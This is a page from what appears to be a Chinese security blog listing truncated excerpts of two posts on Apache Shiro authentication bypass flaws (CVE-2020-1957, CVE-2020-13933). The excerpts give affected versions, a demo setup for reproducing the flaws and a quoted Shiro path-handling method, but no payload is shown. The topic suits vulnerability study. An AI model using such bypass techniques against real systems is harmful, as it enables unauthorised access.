    <article id="post-Apache Shiro/（CVE-2020-1957）Apache Shiro _ 1.5.2 身份认证绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.776Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-1957）Apache-Shiro-lt-1-5-2-身份认证绕过漏洞"><a href="#（CVE-2020-1957）Apache-Shiro-lt-1-5-2-身份认证绕过漏洞" class="headerlink" title="（CVE-2020-1957）Apache Shiro &lt; 1.5.2 身份认证绕过漏洞"></a>（CVE-2020-1957）Apache Shiro &lt; 1.5.2 身份认证绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache Shiro<br>1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Shiro &lt; 1.5.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>明白上文的内容，漏洞复现就很容易了，复现环境代码主要参考网上的开源<a target="_blank" rel="noopener" href="https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic">demo</a>。</p>
<ul>
<li><p>下载demo代码<br>  <a target="_blank" rel="noopener" href="https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic">shiro-basic</a>。</p>
</li>
<li><p>  导入idea</p>
</li>
<li><p>  Shiro版本1.4.2</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qme6001uy8v18qtohzn1" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Shiro/（CVE-2020-13933）Apache Shiro _ 1.6.0 身份认证绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Shiro/%EF%BC%88CVE-2020-13933%EF%BC%89Apache%20Shiro%20_%201.6.0%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.773Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-13933）Apache-Shiro-lt-1-6-0-身份认证绕过漏洞"><a href="#（CVE-2020-13933）Apache-Shiro-lt-1-6-0-身份认证绕过漏洞" class="headerlink" title="（CVE-2020-13933）Apache Shiro &lt; 1.6.0 身份认证绕过漏洞"></a>（CVE-2020-13933）Apache Shiro &lt; 1.6.0 身份认证绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>2020年8月18日，Apache Shiro官方发布安全通告 Apache<br>Shiro身份验证绕过漏洞（CVE-2020-13933），经过分析，攻击者可以通过构造特殊的HTTP请求实现身份验证绕过。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Shiro &lt; 1.6.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据shiro历史上的认证绕过漏洞，本质问题就是springboot对url的处理和shiro的处理不一致导致的认证绕过。其中shiro的url处理的问题都出在<code>org/apache/shiro/web/util/WebUtils.java</code>类下面，在return</p>
<pre><code>    public static String getPathWithinApplication(HttpServletRequest request) &#123;
        return normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));
    &#125;
</code></pre>
<p>断点，然后我们去springboot的处理url的地方进行断点，<code>org/springframework/web/util/UrlPathHelper.java</code>。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Shiro/%EF%BC%88CVE-2020-13933%EF%BC%89Apache%20Shiro%20_%201.6.0%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Shiro/%EF%BC%88CVE-2020-13933%EF%BC%89Apache%20Shiro%20_%201.6.0%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qme5001ty8v1atf2cdew" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/94/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/93/">93</a><a class="page-number" href="/page/94/">94</a><span class="page-number current">95</span><a class="page-number" href="/page/96/">96</a><a class="page-number" href="/page/97/">97</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/96/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>